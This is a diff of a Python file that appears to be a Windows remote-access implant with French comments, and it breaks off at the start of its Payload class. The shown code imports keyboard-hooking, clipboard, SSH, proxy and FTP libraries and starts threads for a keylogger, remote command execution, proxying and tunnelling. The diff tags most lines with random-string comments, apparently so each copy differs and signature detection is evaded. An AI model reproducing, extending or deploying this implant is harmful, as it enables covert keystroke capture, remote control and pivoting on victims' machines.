@@ -1,89 +1,87 @@
-import socket
-import os
-import subprocess
-from ctypes import *
-import pythoncom
-import pyHook
-import ctypes
-import win32clipboard
-# import win32gui
-from win32com.makegw.makegwparse import *
+import socket #<RANDOMSTRING>
+import os #<RANDOMSTRING>
+import subprocess #<RANDOMSTRING>
+from ctypes import * #<RANDOMSTRING>
+import pythoncom #<RANDOMSTRING>
+import pyHook #<RANDOMSTRING>
+import ctypes  #<RANDOMSTRING>
+import win32clipboard #<RANDOMSTRING>
+from win32com.makegw.makegwparse import * #<RANDOMSTRING>
 import threading
-import inspect
+import inspect #<RANDOMSTRING>
 import sys
-import time
-import random
+import time #<RANDOMSTRING>
+import random #<RANDOMSTRING>
 import string
 from ftplib import FTP
-import asyncio
+import asyncio #<RANDOMSTRING>
 import pproxy
-import getpass
+import getpass #<RANDOMSTRING>
 import select
 from optparse import OptionParser
-import paramiko
-
+import paramiko #<RANDOMSTRING>
 # pour la compil
 import imp
-
-def get_or_create_eventloop():
+ #<RANDOMSTRING>
+def get_or_create_eventloop(): #<RANDOMSTRING>
     try:
-        return asyncio.get_event_loop()
+        return asyncio.get_event_loop() #<RANDOMSTRING>
     except RuntimeError as ex:
         if "There is no current event loop in thread" in str(ex):
-            loop = asyncio.new_event_loop()
+            loop = asyncio.new_event_loop() #<RANDOMSTRING>
             asyncio.set_event_loop(loop)
-            return asyncio.get_event_loop()
+            return asyncio.get_event_loop() #<RANDOMSTRING>
 
-def getString(length=6):
+def getString(length=6): #<RANDOMSTRING>
     """Générer une chaîne aléatoire de longueur fixe"""
-    str = string.ascii_lowercase
+    str = string.ascii_lowercase #<RANDOMSTRING>
     return ''.join(random.choice(str) for i in range(length))
 
-def _async_raise(tid, exctype):
+def _async_raise(tid, exctype): #<RANDOMSTRING>
     """raises the exception, performs cleanup if needed"""
-    tid = ctypes.c_long(tid)
+    tid = ctypes.c_long(tid) #<RANDOMSTRING>
     if not inspect.isclass(exctype):
-        exctype = type(exctype)
+        exctype = type(exctype) #<RANDOMSTRING>
     res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
-        tid, ctypes.py_object(exctype))
-    if res == 0:
+        tid, ctypes.py_object(exctype)) #<RANDOMSTRING>
+    if res == 0: #<RANDOMSTRING>
         raise ValueError("invalid thread id")
     elif res != 1:
         # """if it returns a number greater than one, you're in trouble,
         # and you should call it again with exc=NULL to revert the effect"""
         ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
-        raise SystemError("PyThreadState_SetAsyncExc failed")
+        raise SystemError("PyThreadState_SetAsyncExc failed") #<RANDOMSTRING>
 
 
 class Threads:
-
+ #<RANDOMSTRING>
     thread_id = 0
-    thread_name = "null"
+    thread_name = "null" #<RANDOMSTRING>
 
-    def StartThread(self, fonction, arg1="", arg2=""):
+    def StartThread(self, fonction, arg1="", arg2=""): #<RANDOMSTRING>
         if "Keylogger" in fonction:
-            thread = threading.Thread(target=keylog.Keylog, name=fonction)
+            thread = threading.Thread(target=keylog.Keylog, name=fonction) #<RANDOMSTRING>
             thread.start()
-        if "Commande" in fonction:
+        if "Commande" in fonction: #<RANDOMSTRING>
             thread = threading.Thread(
                 target=payload.Commande, name=fonction, args=(arg1,))
             thread.start()
-        if "Proxy" in fonction:
+        if "Proxy" in fonction: #<RANDOMSTRING>
             thread = threading.Thread(
                 target=payload.StartProxy, name=fonction, args=(arg1,))
             thread.start()
-        if "Tunnel" in fonction:
+        if "Tunnel" in fonction: #<RANDOMSTRING>
             thread = threading.Thread(
-                target=payload.StartTunnel, name=fonction, args=(arg1,arg2))
+                target=payload.StartTunnel, name=fonction, args=(arg1,arg2)) #<RANDOMSTRING>
             thread.start()
-        self.thread_id = thread.ident
+        self.thread_id = thread.ident #<RANDOMSTRING>
         self.thread_name = thread.name
         
-
+ #<RANDOMSTRING>
     def StopThread(self):
         print("Arret du Thread : " + self.thread_name +
-              ", numéro : " + str(self.thread_id))
+              ", numéro : " + str(self.thread_id)) #<RANDOMSTRING>
         _async_raise(self.thread_id, SystemExit)
-
+ #<RANDOMSTRING>
 
 class Payload:
